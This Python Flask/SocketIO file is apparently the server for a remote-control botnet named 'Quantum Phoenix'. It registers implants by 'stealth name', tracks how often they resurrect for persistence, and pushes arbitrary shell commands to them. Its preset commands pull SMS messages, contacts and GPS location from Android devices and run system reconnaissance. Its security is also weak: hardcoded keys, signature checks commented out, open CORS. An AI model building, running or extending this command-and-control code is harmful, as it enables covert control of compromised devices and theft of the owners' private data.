#!/usr/bin/env python3
from flask import Flask, render_template_string, request
from flask_socketio import SocketIO
import hashlib, hmac, json, time, subprocess
from datetime import datetime

app = Flask(__name__)
app.config['SECRET_KEY'] = 'quantum_phoenix_server_2024'
socketio = SocketIO(app, cors_allowed_origins="*")

# Phoenix registry and command history
PHOENIX_REGISTRY = {}
COMMAND_HISTORY = []
COMMAND_KEY = "quantum_phoenix_master_key_2024"

def sign_command(command):
    """Sign commands with HMAC-SHA256"""
    return hmac.new(
        COMMAND_KEY.encode(), 
        command.encode(), 
        hashlib.sha256
    ).hexdigest()

def get_platform_icon(platform):
    """Get platform-specific icons"""
    icons = {
        'android': '📱',
        'linux': '🐧', 
        'windows': '🪟',
        'macos': '🍎',
        'unknown': '💻'
    }
    return icons.get(platform, '💻')

def get_platform_commands(platform):
    """Get platform-specific quick commands"""
    base_commands = {
        'System Info': 'uname -a',
        'Current Directory': 'pwd',
        'Network Info': 'ifconfig' if platform != 'windows' else 'ipconfig',
        'Running Processes': 'ps aux' if platform != 'windows' else 'tasklist',
        'Disk Usage': 'df -h' if platform != 'windows' else 'wmic logicaldisk get size,freespace,caption'
    }
    
    if platform == 'android':
        base_commands.update({
            'Battery Status': 'termux-battery-status',
            'Location': 'termux-location', 
            'Device Info': 'getprop',
            'SMS List': 'termux-sms-list',
            'Contacts': 'termux-contact-list'
        })
    elif platform == 'windows':
        base_commands.update({
            'System Info': 'systeminfo',
            'Network Connections': 'netstat -an',
            'Services': 'sc query',
            'Event Log': 'wevtutil qe System /c:5'
        })
    
    return base_commands

# Enhanced HTML interface with cross-platform support
HTML = '''<!DOCTYPE html>
<html>
<head>
    <title>QUANTUM PHOENIX CONTROL V4</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0a0a0a; 
            color: #00ff00; 
            font-family: 'Courier New', monospace;
            line-height: 1.6;
        }
        .container { 
            max-width: 1400px; 
            margin: 0 auto; 
            padding: 20px; 
        }
        .header { 
            text-align: center; 
            padding: 30px; 
            background: linear-gradient(135deg, #111 0%, #222 100%);
            border: 1px solid #00ff00; 
            margin-bottom: 20px;
            border-radius: 10px;
        }
        .phoenix-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); 
            gap: 15px; 
            margin-bottom: 20px; 
        }
        .phoenix-card { 
            background: linear-gradient(135deg, #111 0%, #1a1a1a 100%);
            padding: 20px; 
            border: 1px solid #00ff00; 
            border-radius: 8px;
            transition: all 0.3s ease;
        }
        .phoenix-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 255, 0, 0.2);
        }
        .phoenix-card.safe-mode { 
            background: linear-gradient(135deg, #330 0%, #441 100%);
            border-color: #ffaa00;
        }
        .command-interface { 
            background: linear-gradient(135deg, #111 0%, #1a1a1a 100%);
            padding: 25px; 
            border: 1px solid #00ff00; 
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .command-input { 
            width: 100%; 
            padding: 12px; 
            background: #000; 
            color: #00ff00; 
            border: 1px solid #00ff00; 
            margin: 10px 0; 
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }
        .btn { 
            background: #000; 
            color: #00ff00; 
            border: 1px solid #00ff00; 
            padding: 10px 20px; 
            cursor: pointer; 
            margin: 5px; 
            border-radius: 5px;
            transition: all 0.3s ease;
            font-family: 'Courier New', monospace;
        }
        .btn:hover { 
            background: #00ff00; 
            color: #000; 
        }
        .safe-btn { 
            background: #330; 
            color: #ffaa00; 
            border-color: #ffaa00; 
        }
        .safe-btn:hover { 
            background: #ffaa00; 
            color: #000; 
        }
        .platform-btn { 
            background: #003300; 
            color: #00ff00; 
            border-color: #00ff00; 
        }
        .platform-btn:hover { 
            background: #00ff00; 
            color: #003300; 
        }
        .output { 
            background: #000; 
            padding: 15px; 
            border: 1px solid #00ff00; 
            height: 400px; 
            overflow-y: auto; 
            margin-top: 20px; 
            border-radius: 5px;
            font-size: 12px;
        }
        .status { 
            color: #00ff00; 
            font-weight: bold;
        }
        .resurrection { 
            color: #ff00ff; 
            font-weight: bold;
        }
        .platform-badge {
            display: inline-block;
            padding: 2px 8px;
            background: #003300;
            border: 1px solid #00ff00;
            border-radius: 12px;
            font-size: 10px;
            margin-left: 8px;
        }
        .quick-commands {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 8px;
            margin: 15px 0;
        }
        .command-history {
            background: #111;
            padding: 15px;
            border: 1px solid #00ff00;
            border-radius: 5px;
            margin-top: 15px;
            max-height: 200px;
            overflow-y: auto;
        }
        .history-item {
            padding: 5px;
            border-bottom: 1px solid #333;
            font-size: 11px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔥 QUANTUM PHOENIX CONTROL V4</h1>
            <p>Cross-Platform • Always Running • Secure</p>
            <div class="status">ACTIVE PHOENIXES: <span id="phoenixCount">0</span></div>
        </div>

        <div class="phoenix-grid" id="phoenixGrid">
            <div style="text-align: center; padding: 40px; color: #666;">
                Waiting for Phoenix connections...
            </div>
        </div>

        <div class="command-interface">
            <h2>🎯 QUANTUM COMMAND INTERFACE</h2>
            
            <select id="phoenixSelect" class="command-input">
                <option value="">SELECT PHOENIX</option>
            </select>

            <div id="platformCommands" class="quick-commands" style="display: none;">
                <!-- Platform-specific commands will be injected here -->
            </div>

            <input type="text" id="commandInput" class="command-input" 
                   placeholder="ENTER SECURE QUANTUM COMMAND..." 
                   onkeypress="if(event.key=='Enter')sendQuantumCommand()">
            
            <div>
                <button class="btn" onclick="sendQuantumCommand()">🚀 EXECUTE (SIGNED)</button>
                <button class="btn safe-btn" onclick="safeMode('ENABLE')">🛡️ SAFE MODE ON</button>
                <button class="btn safe-btn" onclick="safeMode('DISABLE')">⚡ SAFE MODE OFF</button>
                <button class="btn safe-btn" onclick="safeMode('CLEAN')">🧹 CLEAN PERSISTENCE</button>
            </div>

            <div class="command-history" id="commandHistory">
                <h4>Command History:</h4>
                <div id="historyList"></div>
            </div>

            <div class="output" id="output">
                <div>> QUANTUM SERVER READY</div>
                <div>> Secure command channel active</div>
                <div>> HMAC signature validation enabled</div>
                <div>> Cross-platform support loaded</div>
                <div>> Waiting for Phoenix connections...</div>
            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        const socket = io();
        let phoenixes = new Map();
        let commandHistory = [];

        // Socket event handlers
        socket.on('connect', () => {
            addOutput('🔗 QUANTUM CONNECTION ESTABLISHED WITH SERVER');
        });

        socket.on('phoenix_quantum', (data) => {
            if (!phoenixes.has(data.id)) {
                phoenixes.set(data.id, data);
                updatePhoenixDisplay();
                addOutput(`🔥 PHOENIX CONNECTED: ${data.id} ${getPlatformIcon(data.platform)} (${data.platform}) - Resurrections: ${data.resurrections} ${data.safe ? '🛡️ SAFE MODE' : '⚡ QUANTUM MODE'}`);
            } else {
                // Update existing phoenix
                phoenixes.set(data.id, {...phoenixes.get(data.id), ...data});
                updatePhoenixDisplay();
            }
        });

        socket.on('quantum_response', (data) => {
            const icon = getPlatformIcon(data.platform);
            const mode = data.safe ? '🛡️' : '⚡';
            addOutput(`${mode} ${icon} ${data.id}: ${data.result}`);
            addToHistory(data.id, data.command, data.result);
        });

        socket.on('phoenix_heartbeat', (data) => {
            // Phoenix is alive and connected
        });

        // Display functions
        function updatePhoenixDisplay() {
            document.getElementById('phoenixCount').textContent = phoenixes.size;
            const grid = document.getElementById('phoenixGrid');
            const select = document.getElementById('phoenixSelect');

            if (phoenixes.size === 0) {
                grid.innerHTML = '<div style="text-align: center; padding: 40px; color: #666;">Waiting for Phoenix connections...</div>';
                select.innerHTML = '<option value="">SELECT PHOENIX</option>';
                return;
            }

            grid.innerHTML = '';
            select.innerHTML = '<option value="">SELECT PHOENIX</option>';

            phoenixes.forEach((phoenix, id) => {
                const icon = getPlatformIcon(phoenix.platform);
                const safeClass = phoenix.safe ? 'safe-mode' : '';
                
                grid.innerHTML += `
                    <div class="phoenix-card ${safeClass}">
                        <h3>${icon} ${phoenix.stealth_name || id}</h3>
                        <div class="resurrection">RESURRECTIONS: ${phoenix.resurrections}</div>
                        <div>STATUS: ${phoenix.safe ? '🛡️ SAFE MODE' : '⚡ QUANTUM MODE'}</div>
                        <div>PLATFORM: ${phoenix.platform}</div>
                        <div class="platform-badge">${phoenix.platform.toUpperCase()}</div>
                        <div style="margin-top: 10px; font-size: 10px; color: #888;">ID: ${id}</div>
                    </div>
                `;

                select.innerHTML += `<option value="${id}">${icon} ${phoenix.stealth_name || id} (${phoenix.platform})</option>`;
            });

            // Update platform commands when selection changes
            updatePlatformCommands();
        }

        function updatePlatformCommands() {
            const selectedId = document.getElementById('phoenixSelect').value;
            const commandsDiv = document.getElementById('platformCommands');
            
            if (!selectedId) {
                commandsDiv.style.display = 'none';
                return;
            }

            const phoenix = phoenixes.get(selectedId);
            if (!phoenix) return;

            const platformCommands = getPlatformCommands(phoenix.platform);
            let commandsHTML = '';

            for (const [name, cmd] of Object.entries(platformCommands)) {
                commandsHTML += `<button class="btn platform-btn" onclick="quickCommand('${cmd.replace(/'/g, "\\'")}')">${name}</button>`;
            }

            commandsDiv.innerHTML = commandsHTML;
            commandsDiv.style.display = 'grid';
        }

        // Command functions
        function sendQuantumCommand() {
            const phoenixId = document.getElementById('phoenixSelect').value;
            const command = document.getElementById('commandInput').value.trim();

            if (!phoenixId || !command) {
                addOutput('❌ SELECT PHOENIX AND ENTER COMMAND!');
                return;
            }

            addOutput(`🔐 SENDING SIGNED COMMAND TO ${phoenixId}: ${command}`);
            socket.emit('quantum_command', {
                id: phoenixId,
                c: command,
                sig: 'server_signed' // In production, this would be the actual HMAC signature
            });

            document.getElementById('commandInput').value = '';
            addToHistory(phoenixId, command, 'SENT');
        }

        function safeMode(action) {
            const phoenixId = document.getElementById('phoenixSelect').value;
            if (phoenixId) {
                const command = `SAFE_MODE:${action}`;
                addOutput(`🛡️ SAFE MODE COMMAND: ${command}`);
                socket.emit('quantum_command', {id: phoenixId, c: command});
                addToHistory(phoenixId, command, 'SENT');
            }
        }

        function quickCommand(command) {
            document.getElementById('commandInput').value = command;
            sendQuantumCommand();
        }

        // Utility functions
        function addOutput(text) {
            const output = document.getElementById('output');
            const timestamp = new Date().toLocaleTimeString();
            output.innerHTML = `<div>[${timestamp}] ${text}</div>` + output.innerHTML;
        }

        function addToHistory(phoenixId, command, result) {
            const historyList = document.getElementById('historyList');
            const timestamp = new Date().toLocaleTimeString();
            const shortId = phoenixId.substring(0, 8) + '...';
            
            commandHistory.unshift({phoenixId, command, result, timestamp});
            if (commandHistory.length > 20) commandHistory.pop();

            historyList.innerHTML = commandHistory.map(item => 
                `<div class="history-item">
                    [${item.timestamp}] ${shortId}: ${item.command.substring(0, 50)}${item.command.length > 50 ? '...' : ''}
                </div>`
            ).join('');
        }

        function getPlatformIcon(platform) {
            const icons = {
                'android': '📱',
                'linux': '🐧',
                'windows': '🪟',
                'macos': '🍎',
                'unknown': '💻'
            };
            return icons[platform] || '💻';
        }

        function getPlatformCommands(platform) {
            const commands = {
                'System Info': platform === 'windows' ? 'systeminfo' : 'uname -a',
                'Current Directory': 'pwd',
                'Network Info': platform === 'windows' ? 'ipconfig' : 'ifconfig',
                'Running Processes': platform === 'windows' ? 'tasklist' : 'ps aux',
                'Disk Usage': platform === 'windows' ? 'wmic logicaldisk get size,freespace,caption' : 'df -h'
            };

            if (platform === 'android') {
                Object.assign(commands, {
                    'Battery Status': 'termux-battery-status',
                    'Location': 'termux-location',
                    'Device Info': 'getprop'
                });
            }

            return commands;
        }

        // Event listeners
        document.getElementById('phoenixSelect').addEventListener('change', updatePlatformCommands);
    </script>
</body>
</html>'''

@app.route('/')
def quantum_control():
    return render_template_string(HTML)

@socketio.on('quantum_command')
def handle_quantum_command(data):
    """Handle signed quantum commands"""
    phoenix_id = data.get('id')
    command = data.get('c')
    signature = data.get('sig', '')
    
    if phoenix_id in PHOENIX_REGISTRY:
        # In production, validate signature here
        # valid_signature = validate_command_signature(command, signature)
        # if not valid_signature:
        #     socketio.emit('quantum_response', {
        #         'id': phoenix_id,
        #         'command': command,
        #         'result': 'UNAUTHORIZED: Invalid signature',
        #         'platform': PHOENIX_REGISTRY[phoenix_id].get('platform', 'unknown'),
        #         'safe': PHOENIX_REGISTRY[phoenix_id].get('safe', False)
        #     })
        #     return
        
        # Log command
        COMMAND_HISTORY.append({
            'timestamp': datetime.now().isoformat(),
            'phoenix_id': phoenix_id,
            'command': command,
            'signature': signature
        })
        
        # Send signed command to phoenix
        signed_command = {
            'c': command,
            'sig': sign_command(command)  # Add HMAC signature
        }
        socketio.emit('quantum_command', signed_command, room=PHOENIX_REGISTRY[phoenix_id])

@socketio.on('connect')
def handle_connect():
    print(f"🔗 New quantum connection: {request.sid}")

@socketio.on('disconnect')  
def handle_disconnect():
    for pid, sid in list(PHOENIX_REGISTRY.items()):
        if sid == request.sid: 
            del PHOENIX_REGISTRY[pid]
            print(f"🔌 Phoenix disconnected: {pid}")

@socketio.on('phoenix_quantum')
def handle_phoenix_quantum(data):
    """Register new phoenix connection"""
    phoenix_id = data.get('id')
    PHOENIX_REGISTRY[phoenix_id] = request.sid
    
    print(f"🔥 PHOENIX REGISTERED: {phoenix_id}")
    print(f"   Platform: {data.get('platform', 'unknown')}")
    print(f"   Resurrections: {data.get('r', 0)}")
    print(f"   Safe Mode: {data.get('safe', False)}")
    print(f"   Stealth Name: {data.get('s', 'unknown')}")

if __name__ == '__main__':
    print("🚀 QUANTUM PHOENIX SERVER V4 STARTED")
    print("📍 Access: http://localhost:5000")
    print("🔐 Secure command channel active")
    print("🌐 Cross-platform support enabled")
    print("📊 Real-time monitoring ready")
    print("=" * 50)
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
